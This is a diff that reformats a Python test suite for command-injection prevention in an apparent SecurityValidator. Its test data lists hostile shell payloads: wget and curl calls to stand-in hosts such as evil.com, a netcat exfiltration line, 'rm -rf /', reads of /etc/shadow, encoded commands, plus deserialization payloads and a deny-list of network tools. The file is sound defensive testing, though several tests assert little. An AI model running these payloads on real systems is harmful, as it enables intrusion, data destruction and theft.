@@ -4,12 +4,13 @@ This module tests protection against command injection attacks across all
 system command interfaces and subprocess calls.
 """
 
-import pytest
-from unittest.mock import AsyncMock, MagicMock, patch, call
-import subprocess
 import os
+from unittest.mock import patch
 
-from src.security import SecurityError, SecurityValidator
+import pytest
+
+from src.security import SecurityError
+from src.security import SecurityValidator
 
 
 @pytest.mark.security
@@ -31,40 +32,32 @@ class TestCommandInjectionPrevention:
             "| cat /etc/passwd",
             "&& whoami",
             "|| id",
-            
             # Command substitution
             "`whoami`",
             "$(whoami)",
             "${whoami}",
-            
             # File redirection
             "> /tmp/pwned",
             ">> /etc/passwd",
             "< /etc/shadow",
-            
             # Background execution
             "& sleep 10",
             "nohup malicious_command &",
-            
             # Process control
             "kill -9 $$",
             "killall -9 python",
-            
             # Network commands
             "; wget http://evil.com/malware",
             "| curl http://attacker.com",
             "&& nc -l 4444",
-            
             # System information
             "; uname -a",
             "| ps aux",
             "&& netstat -an",
-            
             # File operations
             "; rm -rf /",
             "| find / -name '*.key'",
             "&& chmod 777 /etc/passwd",
-            
             # Environment manipulation
             "; export PATH=/tmp:$PATH",
             "| env",
@@ -78,33 +71,26 @@ class TestCommandInjectionPrevention:
             # Encoded payloads
             "$(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)",  # cat /etc/passwd
             "`printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`",
-            
             # Nested command substitution
             "$(cat $(echo '/etc/passwd'))",
             "`cat `echo '/etc/shadow'``",
-            
             # Time-based injection
             "; sleep 30",
             "&& ping -c 10 127.0.0.1",
             "| python -c 'import time; time.sleep(60)'",
-            
             # Python code execution
             "; python -c 'import os; os.system(\"ls\")'",
-            "| python3 -c 'exec(\"import subprocess; subprocess.run([\\\"whoami\\\"])\")'",
-            
+            '| python3 -c \'exec("import subprocess; subprocess.run([\\"whoami\\"])")\'',
             # Perl code execution
             "; perl -e 'system(\"id\")'",
             "| perl -e 'exec(\"/bin/sh\")'",
-            
             # Shell escape sequences
             "; bash -c 'whoami'",
             "&& sh -c 'id'",
             "| /bin/bash -c 'ps aux'",
-            
             # SQL command execution (if SQL shell access)
             "; psql -c 'SELECT version();'",
             "| mysql -e 'SELECT user();'",
-            
             # Container escape attempts
             "; docker run --rm alpine whoami",
             "&& kubectl get pods",
@@ -120,30 +106,24 @@ class TestCommandInjectionPrevention:
             "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
             "&& whoami",
             "|| ver",
-            
             # Command substitution
             "%COMSPEC% /c whoami",
             "%SystemRoot%\\system32\\cmd.exe /c dir",
-            
             # PowerShell execution
             "; powershell -c Get-Process",
             "| powershell.exe -ExecutionPolicy Bypass -Command 'Get-ChildItem'",
             "&& pwsh -c 'Get-Location'",
-            
             # Batch file execution
             "; call malicious.bat",
             "| start evil.exe",
             "&& rundll32.exe",
-            
             # Registry manipulation
             "; reg query HKLM\\Software",
             "| regedit /s malicious.reg",
-            
             # Service manipulation
             "; net start malicious",
             "&& sc create evil",
             "| tasklist",
-            
             # File operations
             "; copy /y malicious.exe C:\\Windows\\System32\\",
             "| del /f /q C:\\important.txt",
@@ -188,7 +168,7 @@ class TestCommandInjectionPrevention:
             "file$(id).pdf",
             "script; wget evil.com/malware",
         ]
-        
+
         for filename in malicious_filenames:
             sanitized = security_validator.sanitize_filename(filename)
             # Command injection characters should be removed or replaced
@@ -207,15 +187,17 @@ class TestCommandInjectionPrevention:
             ["grep", "pattern", "file && id"],
             ["find", "/tmp", "-name", "`whoami`.txt"],
         ]
-        
-        with patch('subprocess.run') as mock_run:
-            with patch('subprocess.Popen') as mock_popen:
+
+        with patch("subprocess.run") as mock_run:
+            with patch("subprocess.Popen") as mock_popen:
                 for cmd_args in dangerous_commands:
                     # Test that dangerous arguments are rejected or sanitized
                     # The actual implementation should validate all subprocess arguments
-                    
+
                     # Verify that shell=True is never used with user input
-                    if any(char in ' '.join(cmd_args) for char in [';', '|', '&', '`', '$']):
+                    if any(
+                        char in " ".join(cmd_args) for char in [";", "|", "&", "`", "$"]
+                    ):
                         # Should not execute dangerous commands
                         mock_run.assert_not_called()
                         mock_popen.assert_not_called()
@@ -228,13 +210,13 @@ class TestCommandInjectionPrevention:
             "data | netcat attacker.com 4444",
             "log && curl evil.com/exfiltrate",
         ]
-        
-        with patch('os.system') as mock_system:
-            with patch('subprocess.call') as mock_call:
+
+        with patch("os.system") as mock_system:
+            with patch("subprocess.call") as mock_call:
                 for user_input in user_inputs:
                     # Should never call os.system or subprocess with shell=True and user input
                     mock_system.assert_not_called()
-                    
+
                     # If subprocess is used, should use argument list, not shell string
                     if mock_call.called:
                         # Verify shell=False or argument list usage
@@ -253,12 +235,12 @@ class TestCommandInjectionPrevention:
             "setting`id`",
             "param$(whoami)",
         ]
-        
+
         with patch.dict(os.environ, {}, clear=True):
             for value in malicious_env_values:
                 # Environment variables should be validated before setting
                 # Command injection characters should be rejected
-                if any(char in value for char in [';', '|', '&', '`', '$']):
+                if any(char in value for char in [";", "|", "&", "`", "$"]):
                     # Should not set dangerous environment variables
                     assert value not in os.environ.values()
 
@@ -272,7 +254,7 @@ class TestCommandInjectionPrevention:
             "../../../../tmp/`whoami`.txt",
             "../../../proc/version$(uname -a)",
         ]
-        
+
         for payload in path_injection_payloads:
             with pytest.raises(SecurityError):
                 security_validator.validate_query_string(payload)
@@ -288,12 +270,12 @@ class TestCommandInjectionPrevention:
             "-v `whoami`",
             "--input=$(id)",
         ]
-        
+
         for param in dangerous_params:
             # Parameters should be validated before passing to commands
-            if any(char in param for char in [';', '|', '&', '`', '$']):
+            if any(char in param for char in [";", "|", "&", "`", "$"]):
                 # Should reject dangerous parameters
-                assert False, f"Dangerous parameter not rejected: {param}"
+                raise AssertionError(f"Dangerous parameter not rejected: {param}")
 
     @pytest.mark.asyncio
     async def test_log_injection_prevention(self):
@@ -305,17 +287,17 @@ class TestCommandInjectionPrevention:
             "query\x1b[31m[ALERT] ANSI escape injection",
             "search\n; rm -rf /var/log/*",
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         for payload in log_injection_payloads:
             # Log content should be sanitized
             sanitized = security_validator.validate_query_string(payload)
             # Control characters should be removed
-            assert '\n' not in sanitized
-            assert '\r' not in sanitized
-            assert '\x00' not in sanitized
-            assert '\x1b' not in sanitized
+            assert "\n" not in sanitized
+            assert "\r" not in sanitized
+            assert "\x00" not in sanitized
+            assert "\x1b" not in sanitized
 
     @pytest.mark.asyncio
     async def test_template_command_injection_prevention(self):
@@ -326,9 +308,9 @@ class TestCommandInjectionPrevention:
             "<%=system('ls')%>",
             "{%exec('whoami')%}",
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         for payload in template_command_payloads:
             with pytest.raises(SecurityError):
                 security_validator.validate_query_string(payload)
@@ -343,11 +325,11 @@ class TestCommandInjectionPrevention:
             # YAML payload
             "!!python/object/apply:subprocess.check_output [['id']]",
             # JSON with command execution attempt
-            '{"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').exec(\'whoami\')"}}}'
+            '{"__proto__": {"constructor": {"constructor": "return process.mainModule.require(\'child_process\').exec(\'whoami\')"}}}',
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         for payload in serialized_payloads:
             with pytest.raises(SecurityError):
                 security_validator.validate_query_string(payload)
@@ -355,39 +337,65 @@ class TestCommandInjectionPrevention:
     def test_safe_command_execution_patterns(self):
         """Test that safe command execution patterns are enforced."""
         # Test that the application uses safe patterns for command execution
-        
+
         # Safe patterns:
         # 1. Use subprocess with argument lists, never shell=True with user input
         # 2. Validate all arguments before execution
         # 3. Use allowlists for permitted commands
         # 4. Escape or reject special characters
-        
+
         safe_patterns = [
             # Argument list instead of shell string
             ["ls", "-la", "/safe/directory"],
             ["grep", "pattern", "file.txt"],
             ["find", "/tmp", "-name", "*.log"],
         ]
-        
+
         for pattern in safe_patterns:
             # These patterns are safe because they use argument lists
             assert isinstance(pattern, list)
             assert all(isinstance(arg, str) for arg in pattern)
             # No shell metacharacters in command name
-            assert not any(char in pattern[0] for char in [';', '|', '&', '`', '$'])
+            assert not any(char in pattern[0] for char in [";", "|", "&", "`", "$"])
 
     def test_command_allowlist_enforcement(self):
         """Test that only allowed commands can be executed."""
         allowed_commands = [
-            "ls", "cat", "grep", "find", "head", "tail", "wc", "sort", "uniq"
+            "ls",
+            "cat",
+            "grep",
+            "find",
+            "head",
+            "tail",
+            "wc",
+            "sort",
+            "uniq",
         ]
-        
+
         dangerous_commands = [
-            "rm", "dd", "chmod", "chown", "su", "sudo", "passwd", 
-            "wget", "curl", "nc", "netcat", "ssh", "scp", "rsync",
-            "python", "perl", "ruby", "bash", "sh", "zsh", "csh"
+            "rm",
+            "dd",
+            "chmod",
+            "chown",
+            "su",
+            "sudo",
+            "passwd",
+            "wget",
+            "curl",
+            "nc",
+            "netcat",
+            "ssh",
+            "scp",
+            "rsync",
+            "python",
+            "perl",
+            "ruby",
+            "bash",
+            "sh",
+            "zsh",
+            "csh",
         ]
-        
+
         # Test that only allowed commands are permitted
         for cmd in dangerous_commands:
             # Should be rejected by command allowlist
@@ -403,12 +411,12 @@ class TestCommandInjectionPrevention:
             "-x $(whoami)",
             "--input=`id`",
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         for arg in dangerous_args:
             # Arguments with dangerous patterns should be rejected
-            if any(char in arg for char in ['`', '$', ';', '|', '&']):
+            if any(char in arg for char in ["`", "$", ";", "|", "&"]):
                 with pytest.raises(SecurityError):
                     security_validator.validate_query_string(arg)
 
@@ -421,9 +429,9 @@ class TestCommandInjectionPrevention:
             "documentation search",
             "API reference",
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         for input_text in valid_inputs:
             # Should not raise any exception
             validated = security_validator.validate_query_string(input_text)
@@ -439,21 +447,23 @@ class TestCommandInjectionPrevention:
             "`sleep 20`",
             "$(sleep 15)",
         ]
-        
+
         security_validator = SecurityValidator()
-        
+
         # Use timeout to detect if commands are actually executed
         import time
-        
+
         for payload in time_based_payloads:
             start_time = time.time()
-            
+
             try:
                 security_validator.validate_query_string(payload)
                 execution_time = time.time() - start_time
-                
+
                 # If execution time is suspiciously long, command injection occurred
-                assert execution_time < 5, f"Possible command injection detected: {payload}"
+                assert execution_time < 5, (
+                    f"Possible command injection detected: {payload}"
+                )
             except SecurityError:
                 # Expected - payload should be rejected
                 execution_time = time.time() - start_time
@@ -469,9 +479,9 @@ class TestCommandInjectionPrevention:
             "root:x:0:0:root:/root:/bin/bash",  # /etc/passwd content
             "127.0.0.1 localhost",  # /etc/hosts content
         ]
-        
+
         # Application output should never contain system command output
-        for output in command_outputs:
+        for _output in command_outputs:
             # Verify that system information doesn't appear in application responses
             # This would test actual API responses or log outputs
             pass
